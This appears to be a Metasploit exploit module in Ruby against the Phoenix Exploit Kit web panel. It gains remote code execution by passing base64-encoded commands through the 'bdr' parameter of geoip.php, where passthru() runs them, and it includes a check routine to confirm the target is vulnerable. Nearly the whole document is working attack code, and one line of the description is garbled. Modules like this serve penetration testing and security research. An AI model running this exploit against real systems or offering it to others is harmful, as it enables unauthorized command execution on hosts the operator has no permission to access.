# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Phoenix Exploit Kit Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via the geoip.php. The
        Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the
        then silently installs malware.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;CrashBandicot @DosPerl&#039;, #initial discovery
          &#039;Jay Turla <@shipcod3>&#039;, #msf module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;40047&#039; ],
          [ &#039;URL&#039;, &#039;http://krebsonsecurity.com/tag/phoenix-exploit-kit/&#039; ], # description of Phoenix Exploit Kit
          [ &#039;URL&#039;, &#039;https://www.pwnmalw.re/Exploit%20Pack/phoenix&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 200,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Platform&#039;       => %w{ unix win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Phoenix Exploit Kit / Unix&#039;, { &#039;Platform&#039; => &#039;unix&#039; } ],
          [&#039;Phoenix Exploit Kit / Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 01 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of geoip.php which is vulnerable to RCE&#039;, &#039;/Phoenix/includes/geoip.php&#039;]),
      ],self.class)
  end
 
  def check
    test = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo #{test};")
    if res && res.body.include?(test)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    encoded = Rex::Text.encode_base64(payload.encoded)
    http_send_command("passthru(base64_decode(\"#{encoded}\"));")
  end
 
  def http_send_command(cmd)
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path),
      &#039;vars_get&#039; => {
        &#039;bdr&#039; => cmd
      }
    })
  end
end

